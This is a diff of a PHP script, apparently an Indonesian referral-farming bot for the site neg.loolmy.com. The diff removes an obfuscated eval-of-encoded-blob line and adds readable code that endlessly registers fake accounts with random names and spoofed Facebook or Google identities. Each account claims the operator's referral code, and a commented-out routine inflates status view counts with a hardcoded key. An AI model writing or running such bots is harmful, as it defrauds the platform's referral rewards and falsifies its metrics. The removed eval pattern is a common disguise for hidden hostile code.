@@ -1,3 +1,82 @@
 <?php
-eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
+ require_once('modul/modul.php');
+ //include('modul.php');
+ $base = "http://neg.loolmy.com";
+echo "\n";
+echo "\e[94m      BOT LOOLMY            \n";
+echo "\e[91m  BY AST - BY SIRHUKA.COM             \n";
+echo "\e[93m SPOTIFY PREMIUM RP.100.000 -> SPOTIFY.MY.ID   \n";
+echo "\n";
+echo "\e[96m[?] Masukkan Kode Reff : ";
+$reff = trim(fgets(STDIN));
+echo "\e[96m[?] Masukkan Delay(Detik) : ";
+$delay = trim(fgets(STDIN));
+while(true){
+ $dofasnkj = rand(1,60);
+ regis($reff);
+ sleep($delay);
+}
+function regis($reff="04a9573a"){
+  global $base;
+    $nama = rawurlencode(gen_nama());
+  if(rand(0,100)<50){
+  $uid = rand(111111,999999).rand(111111,999999).rand(1111,999999);
+  $type ="facebook";
+  $img="https%3A%2F%2Fplatform-lookaside.fbsbx.com%2Fplatform%2Fprofilepic%2F%3Fasid%3D$uid%26height%3D200%26width%3D200%26ext%3D1579172831%26hash%3DAeQk3b70YU6Zgr2b";
+  } else{
+  $uid = rand(111111,999999).rand(111111,999999).rand(111111,999999).rand(111,99999);
+  $type ="google";
+  $img_kode= gen_string(46);
+  $img="https%3A%2F%2Flh3.googleusercontent.com%2Fa-%2F".$img_kode;
+ 
+  }
+$load = "name=$nama&username=$uid&password=$uid&type=$type&image=$img";
+$d['url']=$base."/api/user/register/4F5A9C3D9A86FA54EACEDDD635185/78a1e86d-860c-41c5-b350-79d83f572d63/";
+$d['data']=$load;
+$d['header']="accept-encoding: gzip, deflate
+cache-control: no-cache
+content-type: application/x-www-form-urlencoded
+host: neg.loolmy.com
+user-agent: okhttp/3.3.1";
+$is = curl($d);
+$r = json_decode($is['result'],true);
+if($r['message']=="You have successfully registered"){
+  $token = $r['values'][5]["value"];  
+  $id = $r['values'][0]["value"];  
+  $d['url']=$base."/api/user/code/4F5A9C3D9A86FA54EACEDDD635185/78a1e86d-860c-41c5-b350-79d83f572d63/";
+  $d['data']="user=$id&key=$token&code=$reff";
+  $is = curl($d);
+  $r = json_decode($is['result'],true);
+  if($r['message']=="Thank You to Join us . The Reference code has been registered"){
+    echo "\n Berhasil! Nama : ".urldecode($nama)." - Reff By $type \n";
+  }
+}else{
+  return false;
+  die();
+}
+}
+//Auto View
+/*
+$x=1;
+view($x);
+*/
+function view($x){
+global $base;
+$encode = get_data($x);
+$d['url']=$base."/api/status/add/view/4F5A9C3D9A86FA54EACEDDD635185/78a1e86d-860c-41c5-b350-79d83f572d63/";
+$d['data']="id=$encode&user=2561&key=0061df813c6b70f4504545f6d8d3b7e046713103";
+$d['header']="accept-encoding: gzip, deflate
+cache-control: no-cache
+content-type: application/x-www-form-urlencoded
+host: neg.loolmy.com
+user-agent: okhttp/3.3.1";
+$is = curl($d);
+$response = $is['result'];
+  if(strlen($response)<10){
+    echo "\nData - ID : $encode \n";
+  }else{
+    echo "Gagal";
+  }
+}
+    
 ?>
